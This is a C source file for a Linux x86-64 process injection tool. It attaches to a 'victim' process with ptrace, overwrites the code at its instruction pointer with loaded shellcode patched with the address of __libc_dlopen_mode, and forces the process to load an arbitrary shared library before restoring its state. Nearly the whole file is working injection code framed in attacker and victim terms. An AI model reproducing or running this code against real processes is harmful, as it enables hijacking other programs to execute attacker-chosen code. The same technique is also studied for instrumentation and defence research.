#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <dlfcn.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/user.h>


#define SUCC                    (0)
#define FAIL                    (1)
#define SIZE_BLAH_BUF           (1024)
#define SIZE_PTRACE_WORD        (8)
#define ERROR_RETURN(...)       do {                                            \
                                    printf("Error: %s\n", strerror(errno));     \
                                    __VA_ARGS__;                                \
                                    return FAIL;                                \
                                } while (0);

typedef unsigned long           ulong;

typedef union _WORD {
    long m_word_full;
    char m_word_part[SIZE_PTRACE_WORD];
} WORD;


int read_victim_code(pid_t pid, void *addr_rip, char *code, int len_code)
{
    WORD word;
    int iter, count_word = len_code / SIZE_PTRACE_WORD;
    for (iter = 0 ; iter < count_word ; ++iter) {
        int ofst = iter * SIZE_PTRACE_WORD;
        long rc = ptrace(PTRACE_PEEKDATA, pid, addr_rip + ofst, NULL);
        if (rc < 0)
            ERROR_RETURN(ptrace(PTRACE_DETACH, pid, NULL, NULL));
        word.m_word_full = rc;
        memcpy(code + ofst, word.m_word_part, SIZE_PTRACE_WORD);
    }

    return SUCC;
}


int write_victim_code(pid_t pid, void *addr_rip, char *code, int len_code)
{
    WORD word;
    int iter, count_word = len_code / SIZE_PTRACE_WORD;
    for (iter = 0 ; iter < count_word ; ++iter) {
        int ofst = iter * SIZE_PTRACE_WORD;
        memcpy(word.m_word_part, code + ofst, SIZE_PTRACE_WORD);
        if (ptrace(PTRACE_POKEDATA, pid, addr_rip + ofst, word.m_word_full) < 0)
            ERROR_RETURN(ptrace(PTRACE_DETACH, pid, NULL, NULL));
    }

    return SUCC;
}


int load_shell_code(char *path_code_file, char *shell_code, int *p_len_code)
{
    int fd_code = open(path_code_file, O_RDONLY);
    if (fd_code == -1)
        return FAIL;

    int len_code = read(fd_code, shell_code, SIZE_BLAH_BUF);
    if (len_code == 0)
        return FAIL;

    close(fd_code);
    *p_len_code = len_code;
    return SUCC;
}


void patch_shell_code(char *shell_code, int *p_len_code, ulong addr_dlopen,
                      char *path_lib)
{
    printf("0x%08lx\n", addr_dlopen);
    /* Append the address of dlopen(). */
    int len_code = *p_len_code;
    shell_code[len_code] = (char)addr_dlopen & 0xff;
    addr_dlopen >>= 0x8;
    shell_code[len_code + 1] = (char)addr_dlopen & 0xff;
    addr_dlopen >>= 0x8;
    shell_code[len_code + 2] = (char)addr_dlopen & 0xff;
    addr_dlopen >>= 0x8;
    shell_code[len_code + 3] = (char)addr_dlopen & 0xff;
    addr_dlopen >>= 0x8;
    shell_code[len_code + 4] = (char)addr_dlopen & 0xff;
    addr_dlopen >>= 0x8;
    shell_code[len_code + 5] = (char)addr_dlopen & 0xff;
    addr_dlopen >>= 0x8;
    shell_code[len_code + 6] = (char)addr_dlopen & 0xff;
    addr_dlopen >>= 0x8;
    shell_code[len_code + 7] = (char)addr_dlopen & 0xff;

    /* Append the name of to be injected library. */
    len_code += 8;
    strcpy(shell_code + len_code, path_lib);

    len_code += strlen(path_lib);
    shell_code[len_code] = 0x0;
    ++len_code;

    /* Append the nop slide if the code length is not a multiple of word size.*/
    div_t count_word = div(len_code, SIZE_PTRACE_WORD);
    int iter, patch = SIZE_PTRACE_WORD - count_word.rem;
    for (iter = 0 ; iter < patch ; ++iter)
        shell_code[len_code + iter] = 0x90;

    *p_len_code = len_code + patch;
}


int get_libdl_start_address(pid_t pid, ulong *p_addr)
{
    char buf_bla[SIZE_BLAH_BUF];
    sprintf(buf_bla, "/proc/%d/maps", pid);
    FILE *fp_map = fopen(buf_bla, "rb");
    if (!fp_map)
        ERROR_RETURN();

    long addr_bgn, addr_end;
    while (fgets(buf_bla, SIZE_BLAH_BUF, fp_map) != NULL) {
        if (!strstr(buf_bla, "/libc-"))
            continue;
        if (!strstr(buf_bla, "r-xp"))
            continue;
        if (sscanf(buf_bla, "%lx-%lx", &addr_bgn, &addr_end) != 2) {
            printf("Cannot extract the starting and ending address.\n");
            goto CLOSE;
        }
        break;
    }
    *p_addr = addr_bgn;

CLOSE:
    fclose(fp_map);
    return SUCC;
}


int get_dlopen_address_in_victim(pid_t victim_pid, ulong *p_addr)
{
    void *hdle_dl = dlopen("libdl.so", RTLD_LAZY);
    if (!hdle_dl)
        ERROR_RETURN();
    ulong addr_dlopen_attacker = (ulong)dlsym(hdle_dl, "__libc_dlopen_mode");
    dlclose(hdle_dl);

    ulong addr_dl_attacker;
    if (get_libdl_start_address(getpid(), &addr_dl_attacker) != SUCC)
        ERROR_RETURN();

    ulong addr_dl_victim;
    if (get_libdl_start_address(victim_pid, &addr_dl_victim) != SUCC)
        ERROR_RETURN();

    // 256 2 4096
    //printf("%d %d %d\n", RTLD_GLOBAL, RTLD_NOW, RTLD_NODELETE);
    *p_addr = addr_dl_victim + (addr_dlopen_attacker - addr_dl_attacker);
    return SUCC;
}


int main(int argc, char **argv)
{
    if (argc != 4) {
        printf("Usage: ./inject_pure_code VICTIM_PID PATH_TO_SHELL_CODE "
               "PATH_TO_HOOK_LIBRARY \n");
        return SUCC;
    }

    char shell_code[SIZE_BLAH_BUF];
    int len_code;
    printf("Load the shell code.\n");
    if (load_shell_code(argv[2], shell_code, &len_code) != SUCC)
        return FAIL;

    /* Acquire the address of dlopen() in victim's memory space. */
    pid_t victim_pid = atoi(argv[1]);
    ulong addr_dlopen_victim;
    if (get_dlopen_address_in_victim(victim_pid, &addr_dlopen_victim) != SUCC)
        ERROR_RETURN();

    patch_shell_code(shell_code, &len_code, addr_dlopen_victim, argv[3]);
    int i;
    for (i = 0 ; i < len_code ; ++i)
        printf("0x%02x\n", 0xff & shell_code[i]);

    /* Attach to the victim process. */
    printf("Attach to the victim process.\n");
    if (ptrace(PTRACE_ATTACH, victim_pid, NULL, NULL) < 0)
        ERROR_RETURN(ptrace(PTRACE_DETACH, victim_pid, NULL, NULL));
    wait(NULL);

    printf("Backup the victim context.\n");
    /* Get the register file of the victim. */
    struct user_regs_struct regs;
    if(ptrace(PTRACE_GETREGS, victim_pid, NULL, &regs) < 0)
        ERROR_RETURN(ptrace(PTRACE_DETACH, victim_pid, NULL, NULL));

    /* Backup the victim code. */
    char victim_code[SIZE_BLAH_BUF];
    if (read_victim_code(victim_pid, (void*)regs.rip, victim_code, len_code) != SUCC)
        return FAIL;

    /* Inject the shell code. */
    printf("Inject the shell code.\n");
    if (write_victim_code(victim_pid, (void*)regs.rip, shell_code, len_code) != SUCC)
        return FAIL;

    /* Force the victim to execute the shell code. */
    printf("Force the victim to execute the shell code.\n");
    if (ptrace(PTRACE_SETREGS, victim_pid, NULL, &regs) < 0)
        ERROR_RETURN(ptrace(PTRACE_DETACH, victim_pid, NULL, NULL));
    if (ptrace(PTRACE_CONT, victim_pid, NULL, NULL) < 0)
        ERROR_RETURN(ptrace(PTRACE_DETACH, victim_pid, NULL, NULL));

    /* Wait for the software interrupt fired by the shell code. */
    wait(NULL);

    /* Restore the victim status. */
    printf("Mission Complete! Restore the status of the victim.\n");
    if (write_victim_code(victim_pid, (void*)regs.rip, victim_code, len_code) != SUCC)
        return FAIL;
    if (ptrace(PTRACE_SETREGS, victim_pid, NULL, &regs) < 0)
        ERROR_RETURN(ptrace(PTRACE_DETACH, victim_pid, NULL, NULL));
    if (ptrace(PTRACE_DETACH, victim_pid, NULL, NULL) < 0)
        ERROR_RETURN(ptrace(PTRACE_DETACH, victim_pid, NULL, NULL));

    return SUCC;
}
